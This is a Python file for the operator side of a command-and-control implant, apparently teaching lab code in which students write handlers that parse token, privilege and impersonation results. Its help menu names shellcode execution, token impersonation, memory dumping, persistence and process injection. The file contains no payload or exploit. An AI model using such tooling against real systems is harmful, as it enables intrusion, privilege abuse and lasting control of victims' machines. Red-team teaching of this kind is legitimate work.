import struct

from generated_commands import CMD_IDS, CMD_NAMES, COMMAND_SPECS
from generated_errors import ERROR_MESSAGES

TOKEN_SUMMARY_HEADER_SIZE = 16
REFERENCE_COMMANDS = {"current-token", "killimplant"}
TOKEN_NAME_LEN = 8


def display_help():
    """Print the local help menu built from the generated command specs."""
    print("\nLocal client commands:")
    print(f"  {'help':<22} Display this local help menu")
    print(f"  {'exit':<22} Close the operator client")
    print(f"  {'pending':<22} List queued or leased tasks on the server")
    print(f"  {'history':<22} List all known tasks and their latest status")
    print(f"  {'check <task_id>':<22} Query a queued task result by task id")
    print(f"  {'ls':<22} List directory contents")
    print(f"  {'cat <file>':<22} Display file contents")
    print(f"  {'mkdir <folder_name>':<22} Create a new folder")
    print(f"  {'rm <folder_name>':<22} Remove an empty folder or file")
    print(f"  {'upload <local_path> <remote_path>':<22} Upload a file to the implant")
    print(f"  {'download <remote_path> <local_path>':<22} Download a file from the implant")
    print(f"  {'ps' :<22} List running processes ")
    print(f"  {'whoami' :22} Display the current security context of the implant")
    print(f"  {'hostname' :<22} Returns the host or computer name")
    print(f"  {'getpid' :<22} Returns the implant process ID")
    print(f"  {'exec <command/program>' :<22} Execute a program or command and return the output, exit status, or error information")
    print(f"  {'shellcodeexec <path_to_shellcode>' :<22} Execute raw shellcode from a file in the current or another process")
    print(f"  {'inspect-token' :<22} Display information about the current token")
    print(f"  {'enable-privilege <privilege_name>' :<22} Attempt to enable a privilege on the current token")
    print(f"  {'disable-Privilege <privilege_name>' :<22} Attempt to disable a privilege on the current token")
    print(f"  {'token-impersonate <pid>' :<22} Attempt to impersonate the token of another process")
    print(f"  {'memread <address> <size>' :<22} Dump the memory of a specific process given an address and a size")
    print(f"  {'modulelist <pid>' :<22} List the loaded modules of a specified process (including the address it's loaded at)")
    print(f"  {'handlelist <pid>' :<22} List all the handles for a given process")
    print(f"  {'env' :<22} List all environment variables for the current process")
    print(f"  {'getenv <var_name>' :<22} Return the value of a named environment variable")
    print(f"  {'setenv <var_name> <value>' :<22} Create or modify an environment variable for the implant process")
    print(f"  {'sleep <interval>' :<22} Change the implant callback interval")
    print(f"  {'kill' :<22} Stops the implant from running")
    print(f"  {'persist' :<22} Install persistence on the target")
    print(f"  {'unpersist' :<22} Removes the persistence on the target")
    print(f"  {'migrate <pid>' :<22} Inject the implant into another process")

    print("\nReference implant commands:")
    for command_spec in COMMAND_SPECS:
        if command_spec["name"] not in REFERENCE_COMMANDS:
            continue

        print(f"  {command_spec['usage']:<22} {command_spec['description']}")

    print("\nStudent TODO implant commands:")
    for command_spec in COMMAND_SPECS:
        if command_spec["name"] in REFERENCE_COMMANDS:
            continue

        print(f"  {command_spec['usage']:<22} {command_spec['description']}")


def display_current_token(payload):
    """
    Example display handler for the current-token command.

    Response format:
    - DWORD elevated
    - DWORD impersonated
    - DWORD userNameLength
    - DWORD userSidLength
    - UTF-16LE username bytes including trailing null
    - UTF-16LE SID string bytes including trailing null

    Students can use this function as the reference implementation for how to
    parse other command responses in the lab.
    """
    if len(payload) < TOKEN_SUMMARY_HEADER_SIZE:
        print(f"[!] current-token payload too short: {len(payload)} bytes")
        return

    elevated, impersonated, user_name_length, user_sid_length = struct.unpack(
        "<IIII",
        payload[:TOKEN_SUMMARY_HEADER_SIZE],
    )
    total_length = TOKEN_SUMMARY_HEADER_SIZE + user_name_length + user_sid_length
    if len(payload) < total_length:
        print(f"[!] current-token payload incomplete: {len(payload)} bytes")
        return

    user_name = payload[
        TOKEN_SUMMARY_HEADER_SIZE:TOKEN_SUMMARY_HEADER_SIZE + user_name_length
    ].decode("utf-16le").rstrip("\x00")
    user_sid_offset = TOKEN_SUMMARY_HEADER_SIZE + user_name_length
    user_sid = payload[user_sid_offset:user_sid_offset + user_sid_length].decode(
        "utf-16le"
    ).rstrip("\x00")

    print(f"  username       : {user_name}")
    print(f"  user_sid       : {user_sid}")
    print(f"  elevated       : {'yes' if elevated else 'no'}")
    print(f"  impersonated   : {'yes' if impersonated else 'no'}")


def display_process_token(payload):
    """
    I used Gemini to help me write this method
    TODO: Students implement this display handler.

    Parse and display the process-token response.
    The implant should return a binary payload that summarizes the token for
    the requested PID. Your lab instructions should define the exact layout.

    Suggested output fields:
    - username
    - user SID
    - elevated (yes/no)
    - impersonated (yes/no)
    """
    print("[TODO] Parse and display the process-token response.")
    print(f"  payload_length : {len(payload)}")
    #if payload:
    #    print(f"  payload_hex    : {payload.hex()}")

    pid = struct.unpack("<I", payload[:4])[0]
    token_payload = payload[4:]

    if len(token_payload) < TOKEN_SUMMARY_HEADER_SIZE:
        print(f"[!] process-token payload too short: {len(token_payload)} bytes")

    elevated, impersonated, user_name_length, user_sid_length = struct.unpack(
        "<IIII",
        token_payload[:TOKEN_SUMMARY_HEADER_SIZE],
    )
    total_length = TOKEN_SUMMARY_HEADER_SIZE + user_name_length + user_sid_length
    if len(token_payload) < total_length:
        print(f"[!] process-token payload incomplete: {len(token_payload)} bytes")
        return

    user_name = token_payload[
        TOKEN_SUMMARY_HEADER_SIZE:TOKEN_SUMMARY_HEADER_SIZE + user_name_length
    ].decode("utf-16le").rstrip("\x00")
    user_sid_offset = TOKEN_SUMMARY_HEADER_SIZE + user_name_length
    user_sid = token_payload[user_sid_offset:user_sid_offset + user_sid_length].decode(
        "utf-16le"
    ).rstrip("\x00")

    print(f"  pid            : {pid}")
    print(f"  username       : {user_name}")
    print(f"  user_sid       : {user_sid}")
    print(f"  elevated       : {'yes' if elevated else 'no'}")
    print(f"  impersonated   : {'yes' if impersonated else 'no'}")

def display_token_privileges(payload): 
    """
    TODO: Students implement this display handler.

    The implant should return a binary payload containing all privileges
    associated with the requested process token.

    Your lab instructions should define how each privilege entry is encoded and
    how the privileges must be displayed.
    """
    #print("[TODO] Parse and display the token-privileges response.")
    print(f"  payload_length : {len(payload)}")
    #if payload:
    #     print(f"  payload_hex    : {payload.hex()}")

    if len(payload) < TOKEN_NAME_LEN:
        print(f"[!] token-privileges payload too short: {len(payload)} bytes")
        return

    pid, count = struct.unpack("<II", payload[:8])
   
    offset = 8

    print(f"  pid            : {pid}")
    print(f"  {'Privilege Name':<45} {'State':<20}")

    for i in range(count):
        if offset + 8 > len(payload):
            print(f"[!] token entry {i} header truncated")
            break

        attr, name_len = struct.unpack("<II", payload[offset:offset+TOKEN_NAME_LEN])
        offset += TOKEN_NAME_LEN

        if name_len == 0:
            name = ""
        else:
            if offset + name_len > len(payload):
                print(f"[!] token entry {i} name truncated")
                break
            name = payload[offset:offset+name_len].decode("utf-16le", errors="replace").rstrip("\x00")
            offset += name_len

        if attr & 2:
            state = "enabled"
        elif attr & 1:
            state = "enabled-by-default"
        else:
            state = "disabled"

        print(f"  {name:<45} {state:<20}")
def display_impersonate_token(payload):
    """
    TODO: Students implement this display handler.

    The implant should return enough information for the operator to tell
    whether impersonation succeeded or failed and, if successful, which token
    is now active.

    Your lab instructions should define the exact payload layout.
    """
    #print("[TODO] Parse and display the impersonate-token response.")
    print(f"  payload_length : {len(payload)}")
    #if payload:
    #    print(f"  payload_hex    : {payload.hex()}")
    pid, status = struct.unpack("II", payload[:8])
    print(f"  pid            : {pid}")
    print(f"  impersonation   : {'success' if status == 0 else 'failed'}")

def display_enable_privilege(payload):
    """
    TODO: Students implement this display handler.

    The implant should return enough information for the operator to tell
    whether the requested privilege was enabled successfully.

    Your lab instructions should define the exact payload layout.
    """
    print(f"  payload_length : {len(payload)}")
    #if payload:
    #    print(f"  payload_hex    : {payload.hex()}")
    # 4 is the length of status DWORD, the rest is the privilege name string
    privilegeName = payload[4:].decode("utf-8", errors="replace").rstrip("\x00")
    status = struct.unpack("<I", payload[:4])[0]
    print(f"  privilege  : {privilegeName.replace(' ', '')}")
    print(f"  status          : {'success' if status == 0 else 'failed'}")


def display_killimplant(payload):
    """Display the killimplant result."""
    if payload:
        print(f"  payload_hex    : {payload.hex()}")
    else:
        print("  Implant termination requested.")


DISPLAY_HANDLERS = {
    CMD_IDS["current-token"]: display_current_token,
    CMD_IDS["process-token"]: display_process_token,
    CMD_IDS["token-privileges"]: display_token_privileges,
    CMD_IDS["impersonate-token"]: display_impersonate_token,
    CMD_IDS["enable-privilege"]: display_enable_privilege,
    CMD_IDS["killimplant"]: display_killimplant,
}


def display_result(command_id, status, payload):
    """
    Dispatch a completed task result to the appropriate display handler.

    Students should implement the command-specific parsing logic in the
    display_* functions above rather than modifying the networking code below.
    """
    print(
        f"\n[result] type={CMD_NAMES.get(command_id, command_id)} "
        f"status=0x{status:08X}"
    )
    if status != 0:
        print(f"  error          : {ERROR_MESSAGES.get(status, 'Unknown error')}")
        return

    handler = DISPLAY_HANDLERS.get(command_id)
    if handler is None:
        print("[!] No display handler registered for this command.")
        print(f"  payload_length : {len(payload)}")
        if payload:
            print(f"  payload_hex    : {payload.hex()}")
        return

    handler(payload)
